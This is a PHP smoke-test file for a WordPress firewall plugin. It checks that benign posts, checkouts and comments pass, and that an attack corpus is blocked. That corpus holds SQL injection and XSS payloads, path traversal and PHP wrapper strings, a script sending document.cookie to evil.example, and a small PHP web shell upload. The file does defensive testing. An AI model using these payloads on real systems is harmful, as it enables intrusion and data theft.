<?php
/**
 * Perdita Core smoke tests: the firewall engine, its config compiler, its
 * loaders, the trust cookie, and the settings section.
 *
 * Loaded by tests/smoke.php's fragment loop. Every option and file it touches
 * is restored: the compiler, the loaders, and the log write into a temp
 * folder through the perdita_firewall_* path filters, and the options go back
 * to their stored values (or away when they didn't exist).
 *
 * @package Perdita_Core
 */

defined( 'ABSPATH' ) || exit;

echo "\n--- firewall (tests/smoke-security-firewall.php) ---\n";

require_once PERDITA_CORE_DIR . 'inc/modules/security/firewall/class-perdita-firewall.php';
require_once PERDITA_CORE_DIR . 'inc/modules/security/firewall/class-perdita-firewall-config.php';
require_once PERDITA_CORE_DIR . 'inc/modules/security/firewall/class-perdita-firewall-loader.php';
require_once PERDITA_CORE_DIR . 'inc/modules/security/class-perdita-security-firewall-admin.php';

$pfw_opt_names = array( 'perdita_security_settings', Perdita_Firewall_Config::KEY_OPTION, Perdita_Firewall_Config::STATE_OPTION );
$pfw_orig      = array();
foreach ( $pfw_opt_names as $pfw_name ) {
	$pfw_orig[ $pfw_name ] = get_option( $pfw_name, '__pfw_absent__' );
}

// Deactivate and uninstall call the security module's teardown, which edits
// the live uploads .htaccess and clears its cron event. Both go back at the end.
$pfw_uploads       = wp_get_upload_dir();
$pfw_uploads_ht    = trailingslashit( $pfw_uploads['basedir'] ) . '.htaccess';
$pfw_uploads_orig  = is_file( $pfw_uploads_ht ) ? (string) file_get_contents( $pfw_uploads_ht ) : null;
$pfw_cron_hook     = class_exists( 'Perdita_Security' ) && defined( 'Perdita_Security::CORE_CHECK_CRON' ) ? Perdita_Security::CORE_CHECK_CRON : 'perdita_security_core_check_run';
$pfw_cron_next     = wp_next_scheduled( $pfw_cron_hook );
$pfw_live_config   = is_file( WP_CONTENT_DIR . '/perdita-firewall/config.php' );
$pfw_live_mu       = is_file( WP_CONTENT_DIR . '/mu-plugins/0-perdita-firewall.php' );

$pfw_tmp = trailingslashit( get_temp_dir() ) . 'pfw-smoke-' . wp_generate_password( 8, false ) . '/';
wp_mkdir_p( $pfw_tmp . 'root' );
wp_mkdir_p( $pfw_tmp . 'mu' );
$pfw_filters = array(
	'perdita_firewall_dir'            => function () use ( $pfw_tmp ) {
		return $pfw_tmp . 'perdita-firewall/';
	},
	'perdita_firewall_bootstrap_path' => function () use ( $pfw_tmp ) {
		return $pfw_tmp . 'perdita-firewall-bootstrap.php';
	},
	'perdita_firewall_mu_dir'         => function () use ( $pfw_tmp ) {
		return $pfw_tmp . 'mu';
	},
	'perdita_firewall_user_ini_path'  => function () use ( $pfw_tmp ) {
		return $pfw_tmp . 'root/.user.ini';
	},
	'perdita_firewall_htaccess_path'  => function () use ( $pfw_tmp ) {
		return $pfw_tmp . 'root/.htaccess';
	},
);
foreach ( $pfw_filters as $pfw_hook => $pfw_cb ) {
	add_filter( $pfw_hook, $pfw_cb );
}

/* ---------- wiring ---------- */

$ok( false !== has_action( 'update_option_perdita_security_settings', array( 'Perdita_Firewall_Config', 'on_update' ) ), 'firewall: perdita-core.php hooks the compiler on update_option_perdita_security_settings' );
$ok( false !== has_action( 'add_option_perdita_security_settings', array( 'Perdita_Firewall_Config', 'on_add' ) ), 'firewall: perdita-core.php hooks the compiler on add_option_perdita_security_settings' );
$ok( false !== has_action( 'update_option_perdita_core', array( 'Perdita_Firewall_Config', 'on_module_state' ) ), 'firewall: a module toggle recompiles the config' );
$ok( false !== has_action( 'deactivate_' . plugin_basename( PERDITA_CORE_FILE ), array( 'Perdita_Firewall_Config', 'on_deactivate' ) ), 'firewall: Core deactivation removes the firewall loaders' );
$ok( false !== strpos( (string) file_get_contents( PERDITA_CORE_DIR . 'uninstall.php' ), 'Perdita_Firewall_Config::uninstall()' ), 'firewall: uninstall.php removes the firewall files and options' );
foreach ( glob( PERDITA_CORE_DIR . 'inc/modules/security/firewall/*.php' ) as $pfw_file ) {
	$pfw_src = (string) file_get_contents( $pfw_file );
	$ok( ! preg_match( '/<<<\s*[\'"]?[A-Za-z_]/', $pfw_src ), 'firewall: no heredoc or nowdoc in ' . basename( $pfw_file ) );
}
$pfw_engine_src = (string) file_get_contents( PERDITA_CORE_DIR . 'inc/modules/security/firewall/class-perdita-firewall.php' );
$ok( ! preg_match( '/\b(?:get_option|apply_filters|add_action|esc_html|wp_[a-z_]+)\s*\(/', $pfw_engine_src ), 'firewall: the engine calls no WordPress function, so it runs before WordPress loads' );

/* ---------- engine config for the corpus ---------- */

$pfw_settings = array_merge(
	Perdita_Firewall_Config::defaults(),
	array(
		'firewall'       => true,
		'firewall_mode'  => 'block',
		'disable_xmlrpc' => true,
		'ip_allowlist'   => array( '198.51.100.0/24', '2001:db8:aa::/48', '192.0.2.7' ),
	)
);
$pfw_cfg = Perdita_Firewall_Config::build( $pfw_settings, true );
$ok( ! empty( $pfw_cfg['enabled'] ) && 'block' === $pfw_cfg['mode'], 'firewall: build() turns the firewall on in block mode from the settings' );
$ok( false === Perdita_Firewall_Config::build( $pfw_settings, false )['enabled'], 'firewall: build() keeps the firewall off while the security module is off' );
$ok( 8 === count( array_filter( $pfw_cfg['rules'] ) ), 'firewall: every rule category is on once the firewall is on' );
$ok( preg_match( '/^[0-9a-f]{64}$/', $pfw_cfg['key'] ) && $pfw_cfg['key'] === get_option( Perdita_Firewall_Config::KEY_OPTION ), 'firewall: the trust key is 64 hex characters, stored once in an option' );
$ok( ! empty( $pfw_cfg['cf_ranges']['v4'] ) && ! empty( $pfw_cfg['cf_ranges']['v6'] ), 'firewall: the Cloudflare ranges compile into the config' );

$pfw_ua     = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36';
$pfw_server = function ( $uri = '/', $extra = array() ) use ( $pfw_ua ) {
	return array_merge(
		array(
			'REQUEST_URI'     => $uri,
			'REQUEST_METHOD'  => 'GET',
			'REMOTE_ADDR'     => '203.0.113.50',
			'SERVER_ADDR'     => '10.0.0.5',
			'HTTP_USER_AGENT' => $pfw_ua,
		),
		$extra
	);
};
$pfw_trust = array( Perdita_Firewall::TRUST_COOKIE => Perdita_Firewall::trust_value( 1, time() + 3600, $pfw_cfg['key'] ) );
$pfw_run   = function ( $req ) use ( $pfw_cfg, $pfw_server ) {
	$req = array_merge(
		array(
			'uri'    => '/',
			'server' => array(),
			'get'    => array(),
			'post'   => array(),
			'cookie' => array(),
			'files'  => array(),
			'body'   => null,
			'config' => $pfw_cfg,
		),
		$req
	);
	return Perdita_Firewall::run( $req['config'], $pfw_server( $req['uri'], $req['server'] ), $req['get'], $req['post'], $req['cookie'], $req['files'], $req['body'] );
};

/* ---------- false-positive corpus: must pass in block mode ---------- */

$pfw_gutenberg = wp_json_encode(
	array(
		'id'      => 42,
		'title'   => 'Spring menu: Select Union Jack scones',
		'content' => "<!-- wp:paragraph {\"align\":\"center\"} -->\n<p class=\"has-text-align-center\">Hi <strong>there</strong>, it's O'Brien's <a href=\"https://example.org/a?b=1&amp;c=2\">menu</a>.</p>\n<!-- /wp:paragraph -->\n<!-- wp:html -->\n<blockquote class=\"twitter-tweet\"><a href=\"https://twitter.com/x/status/1\">tweet</a></blockquote><script async src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>\n<!-- /wp:html -->\n<!-- wp:code --><pre class=\"wp-block-code\"><code>SELECT id FROM wp_posts WHERE post_status = 'publish' -- newest first</code></pre><!-- /wp:code -->",
		'status'  => 'publish',
		'meta'    => array( 'footnotes' => '' ),
	)
);
$pfw_gutenberg_plain = wp_json_encode(
	array(
		'id'      => 43,
		'content' => "<!-- wp:paragraph -->\n<p>How to select a union rep, and why 1 Union Select Rd is our address.</p>\n<!-- /wp:paragraph -->\n<!-- wp:image {\"id\":7,\"sizeSlug\":\"large\",\"linkDestination\":\"none\"} -->\n<figure class=\"wp-block-image size-large\"><img src=\"https://example.org/wp-content/uploads/a.jpg\" alt=\"\" class=\"wp-image-7\"/></figure>\n<!-- /wp:image -->",
	)
);
$pfw_post_data = http_build_query(
	array(
		'billing_first_name' => "D'Arcy",
		'billing_last_name'  => "O'Brien",
		'billing_address_1'  => '1 Union Select Rd',
		'billing_address_2'  => 'Apt 4, Select Union Building',
		'billing_city'       => 'Springfield',
		'billing_email'      => 'darcy+shop@example.com',
		'order_comments'     => "Leave it by the door -- thanks! Don't ring.",
	)
);
$pfw_benign = array(
	'classic post save with HTML and a script embed (trusted)' => array(
		'uri'    => '/wp-admin/post.php',
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'cookie' => $pfw_trust,
		'post'   => array(
			'action'       => 'editpost',
			'post_ID'      => '42',
			'post_title'   => 'Drop Table: our new desk',
			'content'      => '<p>See <a href="https://example.org">this</a>.</p><script src="https://platform.twitter.com/widgets.js"></script><iframe src="https://www.youtube.com/embed/x"></iframe> <img src="a.jpg" onerror="this.remove()">',
			'_wpnonce'     => 'abc123',
			'post_status'  => 'publish',
			'tax_input'    => array( 'post_tag' => 'sql, union, select' ),
		),
	),
	'Gutenberg REST save with a script embed (trusted)' => array(
		'uri'    => '/wp-json/wp/v2/posts/42?_locale=user',
		'server' => array( 'REQUEST_METHOD' => 'POST', 'CONTENT_TYPE' => 'application/json' ),
		'cookie' => $pfw_trust,
		'body'   => $pfw_gutenberg,
	),
	'Gutenberg REST save of plain blocks (untrusted)' => array(
		'uri'    => '/wp-json/wp/v2/posts/43?_locale=user',
		'server' => array( 'REQUEST_METHOD' => 'POST', 'CONTENT_TYPE' => 'application/json' ),
		'body'   => $pfw_gutenberg_plain,
	),
	'WooCommerce checkout with 1 Union Select Rd and a Drop Table product (untrusted)' => array(
		'uri'    => '/?wc-ajax=checkout',
		'get'    => array( 'wc-ajax' => 'checkout' ),
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'cookie' => array(
			'woocommerce_cart_hash'        => 'f1e2d3c4b5a6',
			'wp_woocommerce_session_abc'   => '7||1731900000||1731896400||a1b2c3d4e5f6',
			'woocommerce_items_in_cart'    => '1',
		),
		'post'   => array(
			'billing_first_name'                  => "D'Arcy",
			'billing_last_name'                   => "O'Brien",
			'billing_company'                     => 'Union Select & Sons',
			'billing_country'                     => 'US',
			'billing_address_1'                   => '1 Union Select Rd',
			'billing_address_2'                   => 'Apt 4, Select Union Building',
			'billing_city'                        => 'Springfield',
			'billing_state'                       => 'IL',
			'billing_postcode'                    => '62701',
			'billing_phone'                       => '(217) 555-0100',
			'billing_email'                       => 'darcy+shop@example.com',
			'order_comments'                      => "Leave it by the door -- thanks! Don't ring. I'll be at 1 Union Square.",
			'shipping_method'                     => array( 'flat_rate:1' ),
			'payment_method'                      => 'stripe',
			'cart'                                => array( 'a1b2c3' => array( 'qty' => '2', 'name' => 'Drop Table' ) ),
			'woocommerce-process-checkout-nonce'  => '9f8e7d6c5b',
			'_wp_http_referer'                    => '/?wc-ajax=update_order_review',
		),
	),
	'WooCommerce update_order_review with serialized post_data (untrusted)' => array(
		'uri'    => '/?wc-ajax=update_order_review',
		'get'    => array( 'wc-ajax' => 'update_order_review' ),
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'post'   => array(
			'security'  => '1a2b3c4d5e',
			'payment_method' => 'stripe',
			'country'   => 'US',
			'address'   => '1 Union Select Rd',
			'post_data' => $pfw_post_data,
		),
	),
	'comment with <b> and a URL (untrusted)' => array(
		'uri'    => '/wp-comments-post.php',
		'server' => array( 'REQUEST_METHOD' => 'POST', 'HTTP_REFERER' => 'https://example.org/hello-world/' ),
		'post'   => array(
			'comment'         => "Great post! <b>Bold</b> and <a href=\"https://example.org/a?b=1&c=2\">a link</a>. I'd select the union option -- it's the best. 5 > 3 and x=y.",
			'author'          => "Seán O'Connor",
			'email'           => 'sean@example.org',
			'url'             => 'https://example.org/?p=5&utm_source=x',
			'comment_post_ID' => '5',
			'comment_parent'  => '0',
		),
	),
	'search for "how to select a union rep" (untrusted)' => array(
		'uri' => '/?s=how+to+select+a+union+rep',
		'get' => array( 's' => 'how to select a union rep' ),
	),
	'search for a product named Drop Table (untrusted)' => array(
		'uri' => '/?s=drop+table&post_type=product',
		'get' => array( 's' => 'drop table', 'post_type' => 'product' ),
	),
	'Customizer save with CSS and an HTML widget (trusted)' => array(
		'uri'    => '/wp-admin/admin-ajax.php',
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'cookie' => $pfw_trust,
		'post'   => array(
			'wp_customize'             => 'on',
			'action'                   => 'customize_save',
			'customize_theme'          => 'perdita',
			'customize_changeset_uuid' => '4d3c2b1a-0000-4000-8000-123456789abc',
			'nonce'                    => 'a1b2c3d4e5',
			'customized'               => wp_json_encode(
				array(
					'custom_css[perdita]'  => 'body{background:url("data:image/svg+xml;base64,PHN2Zz4=")} .x::before{content:"\'--"}',
					'widget_custom_html[2]' => array( 'content' => '<script>window.dataLayer=window.dataLayer||[];</script><div onclick="go()">Go</div>' ),
					'blogname'             => "Bob's Union Select Café",
				)
			),
		),
	),
	'admin-ajax heartbeat (untrusted)' => array(
		'uri'    => '/wp-admin/admin-ajax.php',
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'post'   => array(
			'action'    => 'heartbeat',
			'_nonce'    => '0a1b2c3d4e',
			'screen_id' => 'post',
			'has_focus' => 'false',
			'interval'  => '60',
			'data'      => array(
				'wp-refresh-post-lock' => array( 'post_id' => '42', 'lock' => '1731900000:1' ),
				'wp-refresh-post-nonces' => array( 'post_id' => '42' ),
			),
		),
	),
	'login with a password full of quotes and -- (untrusted)' => array(
		'uri'    => '/wp-login.php',
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'post'   => array(
			'log'         => 'admin',
			'pwd'         => "p@ss' OR '1'='1'-- <script>",
			'rememberme'  => 'forever',
			'wp-submit'   => 'Log In',
			'redirect_to' => 'https://example.org/wp-admin/',
			'testcookie'  => '1',
		),
	),
	'password reset with quotes in both fields (untrusted)' => array(
		'uri'    => '/wp-login.php?action=resetpass',
		'get'    => array( 'action' => 'resetpass' ),
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'post'   => array(
			'pass1'     => "a'b\"c-- #1=1",
			'pass2'     => "a'b\"c-- #1=1",
			'rp_key'    => 'AbCdEf123',
			'wp-submit' => 'Save Password',
		),
	),
	'REST comment from a visitor (untrusted)' => array(
		'uri'    => '/wp-json/wp/v2/comments',
		'server' => array( 'REQUEST_METHOD' => 'POST', 'CONTENT_TYPE' => 'application/json; charset=utf-8' ),
		'body'   => wp_json_encode( array( 'post' => 5, 'author_name' => "Zoë O'Neil", 'content' => 'Loved it. Will <em>select</em> the union tour -- 10/10.' ) ),
	),
	'WooCommerce Store API add to cart (untrusted)' => array(
		'uri'    => '/wp-json/wc/store/v1/cart/add-item',
		'server' => array( 'REQUEST_METHOD' => 'POST', 'CONTENT_TYPE' => 'application/json' ),
		'body'   => wp_json_encode( array( 'id' => 12, 'quantity' => 1, 'variation' => array( array( 'attribute' => 'Size', 'value' => "Kids' L" ) ) ) ),
	),
	'image upload from a visitor (untrusted)' => array(
		'uri'    => '/contact/',
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'files'  => array(
			'photo' => array( 'name' => 'holiday photo.jpg', 'type' => 'image/jpeg', 'tmp_name' => '', 'error' => 0, 'size' => 1000 ),
		),
	),
	'pretty permalink with select and union in the slug (untrusted)' => array(
		'uri' => '/2026/11/how-to-select-a-union-rep/',
	),
	'plain GET with tracking args (untrusted)' => array(
		'uri' => '/shop/?utm_source=news&utm_medium=email&fbclid=IwAR0abc',
		'get' => array( 'utm_source' => 'news', 'utm_medium' => 'email', 'fbclid' => 'IwAR0abc' ),
	),
	'oEmbed proxy for a YouTube URL (untrusted)' => array(
		'uri' => '/wp-json/oembed/1.0/proxy?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dabc',
		'get' => array( 'url' => 'https://www.youtube.com/watch?v=abc' ),
	),
	'redirect_to on a login link (untrusted)' => array(
		'uri' => '/wp-login.php?redirect_to=https%3A%2F%2Fexample.org%2Fwp-admin%2F&reauth=1',
		'get' => array( 'redirect_to' => 'https://example.org/wp-admin/', 'reauth' => '1' ),
	),
	'wp-cron loopback from 127.0.0.1' => array(
		'uri'    => '/wp-cron.php?doing_wp_cron=1731900000.1234567890',
		'server' => array( 'REMOTE_ADDR' => '127.0.0.1', 'HTTP_USER_AGENT' => 'WordPress/7.1.5; https://example.org' ),
		'get'    => array( 'doing_wp_cron' => '1731900000.1234567890' ),
	),
	'site health loopback with a WordPress user agent' => array(
		'uri'    => '/wp-admin/site-health.php?health-check-test-wp_version_check=1',
		'server' => array( 'REMOTE_ADDR' => '10.0.0.5', 'HTTP_USER_AGENT' => 'WordPress/7.1.5; https://example.org' ),
		'get'    => array( 'health-check-test-wp_version_check' => '1' ),
	),
	'.well-known request (untrusted)' => array(
		'uri' => '/.well-known/acme-challenge/abc123',
	),
);
foreach ( $pfw_benign as $pfw_label => $pfw_req ) {
	$pfw_v = $pfw_run( $pfw_req );
	$ok( 'allow' === $pfw_v['action'], 'firewall false positives: ' . $pfw_label . ' passes in block mode' . ( 'allow' === $pfw_v['action'] ? '' : ' (got ' . $pfw_v['rule'] . ' on ' . $pfw_v['field'] . ': ' . $pfw_v['match'] . ')' ) );
}
$ok( 'cron_loopback' === $pfw_run( $pfw_benign['wp-cron loopback from 127.0.0.1'] )['reason'], 'firewall: the wp-cron loopback skips inspection' );
$ok( true === $pfw_run( $pfw_benign['Gutenberg REST save with a script embed (trusted)'] )['trusted'], 'firewall: a valid trust cookie marks the request trusted' );

/* ---------- attack corpus: must block ---------- */

$pfw_attacks = array(
	// sqlmap and classic SQL injection.
	"1' OR '1'='1",
	"' or 1=1--",
	'1 AND 1=1',
	"1' AND 1234=1234 AND 'abcd'='abcd",
	'-1 UNION SELECT 1,2,3--',
	"1' UNION ALL SELECT NULL,NULL,CONCAT(0x7162787671,0x4b4c4d,0x716a6b7a71)-- -",
	'1/**/UNION/**/SELECT/**/user_login,user_pass/**/FROM/**/wp_users',
	'1 /*!50000UNION*/ /*!50000SELECT*/ 1,2',
	'1 AND SLEEP(5)',
	"1' AND (SELECT 1234 FROM (SELECT(SLEEP(5)))abcd)-- x",
	"1;WAITFOR DELAY '0:0:5'--",
	'1 AND BENCHMARK(5000000,MD5(1))',
	'1 AND extractvalue(1,concat(0x7e,version()))',
	'1 and updatexml(1,concat(0x7e,(select user())),1)',
	"admin'--",
	"admin' #",
	"1'; DROP TABLE wp_users;--",
	'%2527%20OR%25201%3D1--',
	"1' ORDER BY 10--",
	'1 UNION SELECT table_name FROM information_schema.tables',
	'1 AND ASCII(SUBSTRING((SELECT user_pass FROM wp_users LIMIT 1),1,1))>64',
	'1 UNION SELECT @@version',
	"1' AND 1=1 UNION SELECT LOAD_FILE('/etc/passwd')-- -",
	"1 INTO OUTFILE '/var/www/shell.php'",
	// XSS cheat sheet.
	'<script>alert(1)</script>',
	'"><script>alert(String.fromCharCode(88,83,83))</script>',
	'<img src=x onerror=alert(1)>',
	'<svg/onload=alert(document.domain)>',
	'<body onload=alert(1)>',
	'<a href="javascript:alert(1)">x</a>',
	'<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
	'<a href="jav&#x09;ascript:alert(1)">x</a>',
	'%3Cscript%3Ealert(1)%3C%2Fscript%3E',
	'%253Cscript%253Ealert(1)%253C%252Fscript%253E',
	'<iframe src="//evil.example"></iframe>',
	'<div style="width:expression(alert(1))">',
	"';alert(1)//",
	'<details open ontoggle=alert(1)>',
	'<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
	// Traversal, LFI, wrappers.
	'../../wp-config.php',
	'....//....//etc/passwd',
	'..%2F..%2F..%2Fetc%2Fpasswd',
	'php://filter/convert.base64-encode/resource=wp-config.php',
	"image.jpg\0.php",
	'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==',
	'..\\..\\..\\windows\\win.ini',
	'expect://id',
	'phar://uploads/evil.jpg',
	// Remote includes.
	'http://evil.example/shell.txt?',
	'-d allow_url_include=1 -d auto_prepend_file=php://input',
);
foreach ( $pfw_attacks as $pfw_payload ) {
	$pfw_v = $pfw_run(
		array(
			'uri' => '/?id=1',
			'get' => array( 'id' => $pfw_payload ),
		)
	);
	$ok( 'block' === $pfw_v['action'], 'firewall attacks: query payload blocks: ' . substr( str_replace( "\0", '\\0', $pfw_payload ), 0, 70 ) . ( 'block' === $pfw_v['action'] ? ' (' . $pfw_v['rule'] . ')' : '' ) );
}
$pfw_v = $pfw_run(
	array(
		'uri' => '/?file=x',
		'get' => array( 'file' => 'https://evil.example/shell' ),
	)
);
$ok( 'rfi-002' === $pfw_v['rule'], 'firewall attacks: a remote URL in an include-style parameter blocks as rfi-002' );
$pfw_v = $pfw_run(
	array(
		'uri' => '/?file=x',
		'get' => array( 'file' => 'https://' . $pfw_cfg['host'] . '/a.pdf' ),
	)
);
$ok( 'allow' === $pfw_v['action'], 'firewall: a URL to this site in an include-style parameter passes' );
$pfw_v = $pfw_run(
	array(
		'uri'    => '/wp-comments-post.php',
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'post'   => array( 'comment' => 'nice <script>document.location="https://evil.example/?c="+document.cookie</script>' ),
	)
);
$ok( 'block' === $pfw_v['action'] && 'post:comment' === $pfw_v['field'] && 'xss' === $pfw_v['category'], 'firewall attacks: a script in a comment blocks, and the verdict names post:comment' );
$pfw_v = $pfw_run(
	array(
		'uri'    => '/wp-json/wp/v2/comments',
		'server' => array( 'REQUEST_METHOD' => 'POST', 'CONTENT_TYPE' => 'application/json' ),
		'body'   => wp_json_encode( array( 'post' => 5, 'content' => '<img src=x onerror=alert(1)>' ) ),
	)
);
$ok( 'block' === $pfw_v['action'] && 'json:content' === $pfw_v['field'], 'firewall attacks: an XSS payload in an untrusted JSON body blocks as json:content' );
$pfw_body_calls = 0;
$pfw_v          = $pfw_run(
	array(
		'uri'    => '/wp-json/wp/v2/posts/42',
		'server' => array( 'REQUEST_METHOD' => 'POST', 'CONTENT_TYPE' => 'application/json' ),
		'cookie' => $pfw_trust,
		'body'   => function () use ( &$pfw_body_calls ) {
			++$pfw_body_calls;
			return '{"content":"<script>x</script>"}';
		},
	)
);
$ok( 'allow' === $pfw_v['action'] && 0 === $pfw_body_calls, 'firewall: a trusted request never reads the JSON body' );
$pfw_v = $pfw_run(
	array(
		'uri'    => '/',
		'cookie' => array( 'tracking' => "1' AND SLEEP(5)-- x" ),
	)
);
$ok( 'block' === $pfw_v['action'] && 'cookie:tracking' === $pfw_v['field'], 'firewall attacks: SQL injection in a cookie blocks' );
$pfw_v = $pfw_run(
	array(
		'uri'    => '/',
		'cookie' => array( 'note' => '<script>alert(1)</script>' ),
	)
);
$ok( 'allow' === $pfw_v['action'], 'firewall: cookies get the SQL injection rules only' );
$pfw_v = $pfw_run( array( 'server' => array( 'HTTP_USER_AGENT' => "Mozilla/5.0' AND SLEEP(5)-- x" ) ) );
$ok( 'block' === $pfw_v['action'] && 'ua' === $pfw_v['field'], 'firewall attacks: SQL injection in the user agent blocks' );

$pfw_requests = array(
	'sqlmap user agent'     => array( 'server' => array( 'HTTP_USER_AGENT' => 'sqlmap/1.8.11#stable (https://sqlmap.org)' ) ),
	'WPScan user agent'     => array( 'server' => array( 'HTTP_USER_AGENT' => 'WPScan v3.8.27 (https://wpscan.com/wordpress-security-scanner)' ) ),
	'Nikto user agent'      => array( 'server' => array( 'HTTP_USER_AGENT' => 'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)' ) ),
	'Nuclei user agent'     => array( 'server' => array( 'HTTP_USER_AGENT' => 'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' ) ),
	'.env probe'            => array( 'uri' => '/.env' ),
	'.env.production probe' => array( 'uri' => '/.env.production' ),
	'.git/config probe'     => array( 'uri' => '/.git/config' ),
	'wp-config.php.bak'     => array( 'uri' => '/wp-config.php.bak' ),
	'wp-config.php~'        => array( 'uri' => '/wp-config.php~' ),
	'debug.log'             => array( 'uri' => '/wp-content/debug.log' ),
	'database dump'         => array( 'uri' => '/backup.sql' ),
	'xmlrpc.php while XML-RPC is off' => array( 'uri' => '/xmlrpc.php', 'server' => array( 'REQUEST_METHOD' => 'POST' ) ),
	'traversal in the path' => array( 'uri' => '/wp-content/plugins/x/download.php/..%2F..%2F..%2Fwp-config.php' ),
);
foreach ( $pfw_requests as $pfw_label => $pfw_req ) {
	$pfw_v = $pfw_run( $pfw_req );
	$ok( 'block' === $pfw_v['action'], 'firewall attacks: ' . $pfw_label . ' blocks' . ( 'block' === $pfw_v['action'] ? ' (' . $pfw_v['rule'] . ')' : '' ) );
}
$pfw_v = $pfw_run(
	array(
		'uri'    => '/',
		'cookie' => $pfw_trust,
		'server' => array( 'HTTP_USER_AGENT' => 'sqlmap/1.8.11#stable (https://sqlmap.org)' ),
	)
);
$ok( 'block' === $pfw_v['action'], 'firewall: the trust cookie never skips the scanner and probe rules' );
$pfw_v = $pfw_run( array( 'uri' => '/wp-config-sample.php' ) );
$ok( 'allow' === $pfw_v['action'], 'firewall: wp-config-sample.php is no probe' );

// Uploads.
$pfw_shell = $pfw_tmp . 'upload.tmp';
file_put_contents( $pfw_shell, "GIF89a\n<?php system(\$_GET['c']); ?>" );
$pfw_jpg = $pfw_tmp . 'photo.tmp';
file_put_contents( $pfw_jpg, "\xFF\xD8\xFF\xE0 plain image bytes" );
foreach ( array( 'shell.php', 'shell.php.jpg', 'shell.PhTmL', 'shell.php5', '.htaccess', 'x.phar' ) as $pfw_name ) {
	$pfw_v = $pfw_run(
		array(
			'server' => array( 'REQUEST_METHOD' => 'POST' ),
			'files'  => array( 'upload' => array( 'name' => $pfw_name, 'tmp_name' => $pfw_jpg, 'error' => 0, 'size' => 10 ) ),
		)
	);
	$ok( 'upload-001' === $pfw_v['rule'], 'firewall attacks: an untrusted upload named ' . $pfw_name . ' blocks' );
}
$pfw_v = $pfw_run(
	array(
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'files'  => array( 'upload' => array( 'name' => array( 'a.jpg', 'b.gif' ), 'tmp_name' => array( $pfw_jpg, $pfw_shell ), 'error' => array( 0, 0 ), 'size' => array( 10, 10 ) ) ),
	)
);
$ok( 'upload-002' === $pfw_v['rule'] && 'file:upload' === $pfw_v['field'], 'firewall attacks: PHP code inside an image upload blocks (multi-file field)' );
$pfw_v = $pfw_run(
	array(
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'cookie' => $pfw_trust,
		'files'  => array( 'async-upload' => array( 'name' => 'plugin-file.php', 'tmp_name' => $pfw_shell, 'error' => 0, 'size' => 10 ) ),
	)
);
$ok( 'allow' === $pfw_v['action'], 'firewall: a trusted user can upload a PHP file (the content rules skip trusted requests)' );

/* ---------- modes, allowlist, exclusions ---------- */

$pfw_monitor         = $pfw_cfg;
$pfw_monitor['mode'] = 'monitor';
$pfw_v               = $pfw_run(
	array(
		'config' => $pfw_monitor,
		'get'    => array( 'id' => "1' OR '1'='1" ),
	)
);
$ok( 'monitor' === $pfw_v['action'] && 'sqli-005' === $pfw_v['rule'], 'firewall: monitor mode reports the match and lets the request through' );
$pfw_off            = $pfw_cfg;
$pfw_off['enabled'] = false;
$ok( 'allow' === $pfw_run( array( 'config' => $pfw_off, 'get' => array( 'id' => "1' OR '1'='1" ) ) )['action'], 'firewall: a config with enabled false allows everything' );

foreach ( array( '198.51.100.77', '192.0.2.7', '2001:db8:aa:1::5' ) as $pfw_ip ) {
	$pfw_v = $pfw_run(
		array(
			'server' => array( 'REMOTE_ADDR' => $pfw_ip, 'HTTP_USER_AGENT' => 'sqlmap/1.8' ),
			'get'    => array( 'id' => "1' OR '1'='1" ),
		)
	);
	$ok( 'allow' === $pfw_v['action'] && 'allowlist' === $pfw_v['reason'], 'firewall: allowlisted ' . $pfw_ip . ' skips every rule (CIDR and exact, IPv4 and IPv6)' );
}
$ok( 'block' === $pfw_run( array( 'server' => array( 'REMOTE_ADDR' => '198.51.101.1' ), 'get' => array( 'id' => "1' OR '1'='1" ) ) )['action'], 'firewall: an address next to the allowlisted /24 still gets inspected' );

// Cloudflare: the header counts only from a Cloudflare connection.
$pfw_v = $pfw_run( array( 'server' => array( 'REMOTE_ADDR' => '173.245.48.10', 'HTTP_CF_CONNECTING_IP' => '198.51.100.9' ), 'get' => array( 'id' => "1' OR '1'='1" ) ) );
$ok( 'allowlist' === $pfw_v['reason'] && '198.51.100.9' === $pfw_v['ip'], 'firewall: CF-Connecting-IP from a Cloudflare range names the visitor' );
$pfw_v = $pfw_run( array( 'server' => array( 'REMOTE_ADDR' => '203.0.113.9', 'HTTP_CF_CONNECTING_IP' => '198.51.100.9' ), 'get' => array( 'id' => "1' OR '1'='1" ) ) );
$ok( 'block' === $pfw_v['action'] && '203.0.113.9' === $pfw_v['ip'], 'firewall: a spoofed CF-Connecting-IP from outside Cloudflare is ignored' );

$pfw_ex               = $pfw_cfg;
$pfw_ex['exclusions'] = array(
	array( 'rule' => 'sqli-005', 'path' => '/wp-json/my-plugin/', 'param' => 'q' ),
	array( 'rule' => 'xss', 'path' => '/wp-admin/admin-ajax.php', 'param' => '' ),
);
$ok( 'allow' === $pfw_run( array( 'config' => $pfw_ex, 'uri' => '/wp-json/my-plugin/v1/find', 'get' => array( 'q' => "1' OR '1'='1" ) ) )['action'], 'firewall exclusions: a rule id excluded for one path and parameter passes there' );
$ok( 'block' === $pfw_run( array( 'config' => $pfw_ex, 'uri' => '/wp-json/my-plugin/v1/find', 'get' => array( 'other' => "1' OR '1'='1" ) ) )['action'], 'firewall exclusions: the same payload in another parameter still blocks' );
